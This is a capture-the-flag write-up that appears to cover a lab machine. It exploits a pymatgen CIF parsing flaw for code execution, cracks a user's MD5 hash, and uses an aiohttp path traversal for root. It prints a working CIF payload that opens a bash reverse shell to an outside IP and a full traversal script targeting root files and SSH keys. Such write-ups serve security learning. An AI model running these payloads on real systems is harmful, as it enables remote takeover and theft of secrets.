# ENUMERATION
---

## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | ssh |
| 5000 | http |

We got a website open on port 5000, let's start with reconnaissance.

# RECONNAISSANCE
---

![Pasted image 20250109152107.png](../../IMAGES/Pasted%20image%2020250109152107.png)

Base website is like that, source code seems normal too, we got a login and a register in the website, let's check them both:

![Pasted image 20250109152210.png](../../IMAGES/Pasted%20image%2020250109152210.png)

Since we don't have an account, let's register and use burp to check the behavior:

![Pasted image 20250109152342.png](../../IMAGES/Pasted%20image%2020250109152342.png)

Once we've registered, we are sent dashboard, let's use fuzzing and check if there's anything useful:

## Fuzzing
----


![Pasted image 20250109152419.png](../../IMAGES/Pasted%20image%2020250109152419.png)

We found a `login`, `logout`, `dashboard` and an `upload` directory which seems to be the most interesting one, let's check our dashboard:

```ad-note

##### Credentials
----
`hackerTESTING`:`test`
```

![Pasted image 20250109152606.png](../../IMAGES/Pasted%20image%2020250109152606.png)

We can see that inside of our dashboard we can upload a `CIF` file, if we click to see the example, a file downloads automatically, let's check that file:

![Pasted image 20250109152717.png](../../IMAGES/Pasted%20image%2020250109152717.png)

It is an ascii file, it has these contents:

![Pasted image 20250109152744.png](../../IMAGES/Pasted%20image%2020250109152744.png)

Searching on the web, we find that a CIF file has the following definition:

```ad-note
### CIF
----
Crystallographic Information File (CIF) is a standard text file format for representing crystallographic information, promulgated by the International Union of Crystallography (IUCr). CIF was developed by the IUCr Working Party on Crystallographic Information in an effort sponsored by the IUCr Commission on Crystallographic Data and the IUCr Commission on Journals. The file format was initially published by Hall, Allen, and Brown[1] and has since been revised, most recently versions 1.1 and 2.0.[2] Full specifications for the format are available at the IUCr website. Many computer programs for molecular viewing are compatible with this format, including Jmol. 
```

Nice, let's begin with exploitation.

# EXPLOITATION
---

We already know we have to deal with CIF files, let's search for some sort of exploit regarding those files:

![Pasted image 20250109152953.png](../../IMAGES/Pasted%20image%2020250109152953.png)

Found an Arbitrary code execution, here's the repository: [here](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

In order to exploit this vulnerability, we need to reproduce the following steps:

```
data_Example
_cell_length_a 10.00000
_cell_length_b 10.00000
_cell_length_c 10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta 90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.15.36/4444 0>&1\'");0,0,0'

_space_group_magn.number_BNS 62.448
_space_group_magn.name_BNS "P n' m a' "
```

```ad-hint
1. Create a file with the contents shown above.
2. Upload the file.
3. Click view and have a listener set on the port we specified.
4. Get the connection.


##### Output
---

```

Nice, let's [stabilize our shell](../../Commands/Shell%20Tricks/STABLE%20SHELL.md):

![Pasted image 20250109164825.png](../../IMAGES/Pasted%20image%2020250109164825.png)

Once we've got our stable shell, let's look around this machine:

![Pasted image 20250109164943.png](../../IMAGES/Pasted%20image%2020250109164943.png)

At `/home/app` we have a folder containing `CVE-2021-4034` which talks about the following:

![Pasted image 20250109165016.png](../../IMAGES/Pasted%20image%2020250109165016.png)

Let's keep that info for now, searching around we find another user in the machine: 

![Pasted image 20250109165134.png](../../IMAGES/Pasted%20image%2020250109165134.png)

We have an user named `rosa`, inside of rosa's home, we are unable to read it, we need some sort of way to get the credentials of rosa, that's when I found a folder named `/instances` inside of app home, this contains a `database.db` file, when we read it we find the following:

![Pasted image 20250109165522.png](../../IMAGES/Pasted%20image%2020250109165522.png)

If we look closely, we find rosa's name and a MD5 hash alongside it:

![Pasted image 20250109165555.png](../../IMAGES/Pasted%20image%2020250109165555.png)

Let's crack the hash:

![Pasted image 20250109165604.png](../../IMAGES/Pasted%20image%2020250109165604.png)

So, credentials are the following:

```ad-note
`rosa`:`unicorniosrosados`
```

![Pasted image 20250109165647.png](../../IMAGES/Pasted%20image%2020250109165647.png)

We got access and now we can read `user.txt`:

```ad-note

`user`: `1a66e45880e8f92fcfe0f6a05f622662`
```

Let's start with privilege escalation.

# PRIVILEGE ESCALATION
---


We can start by checking our sudo permissions:

![Pasted image 20250109165811.png](../../IMAGES/Pasted%20image%2020250109165811.png)

We have none, let's check some interesting files:

![Pasted image 20250109165933.png](../../IMAGES/Pasted%20image%2020250109165933.png)

Nothing, let's use linpeas then:


![Pasted image 20250109170136.png](../../IMAGES/Pasted%20image%2020250109170136.png)

Something is running on port `8080` inside of this machine, let's use port forwarding and check:

```ad-hint

##### Port forwarding
----

`ssh -L 9001:127.0.0.1:8080 rosa@10.10.11.38`




```

Weird, we have a page that seems to check earnings and views per month of a page, once we go to `List Services`, we are able to see this:

![Pasted image 20250109170448.png](../../IMAGES/Pasted%20image%2020250109170448.png)

After trying a couple things, nothing seemed to work, so, I tried the following:

```ad-hint

1. Use curl to get the headers of the page: `curl 127.0.0.1:9001 --head`
2. Found this is running `aiohttp/3.9.1`
3. Search for any vulnerability regarding that version.
```

So, I found the following CVE:

![Pasted image 20250109170749.png](../../IMAGES/Pasted%20image%2020250109170749.png)

Here's the repository: [here](https://github.com/z3rObyte/CVE-2024-23334-PoC), it talks about a path traversal, we can reproduce the following steps in order to get the root flag (We can also get root access by reading `/root/.ssh/id_rsa):

```
#!/bin/bash

url="http://localhost:8080"
string="../"
payload="/assets/"
file="root/root.txt" # without the first /

for ((i=0; i<15; i++)); do
 payload+="$string"
 echo "[+] Testing with $payload$file"
 status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
 echo -e "\tStatus code --> $status_code"
 
 if [[ $status_code -eq 200 ]]; then
 curl -s --path-as-is "$url$payload$file"
 break
 fi
done
```

```ad-hint
1. Create a `exp.sh` file with the contents shown above.
2. `chmod +x exp.sh`
3. `./exp.sh`
4. Get your root flag!

### Output
---

Root: `2cbb12ac6cf8301162f1db597fd5ee7c`
```


Just like that, machine is done!

